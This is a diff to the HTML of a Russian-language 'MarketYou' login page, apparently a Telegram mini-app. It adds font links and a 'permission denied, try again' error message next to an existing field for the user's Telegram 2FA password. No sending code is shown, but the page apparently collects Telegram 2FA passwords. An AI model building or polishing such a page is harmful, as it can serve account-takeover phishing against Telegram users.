@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MarketYou - Вход</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="styles.css">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
@@ -21,6 +24,7 @@
                 <input type="password" id="2faInput" placeholder="Пароль 2FA" class="input-field hidden">
                 <button id="submitBtn" class="submit-btn hidden">Подтвердить</button>
                 <div id="successMsg" class="success hidden">✅ Авторизация успешна!</div>
+                <div id="errorMsg" class="error hidden">❌ Разрешение отклонено. Попробуйте снова.</div>
             </div>
         </main>
     </div>
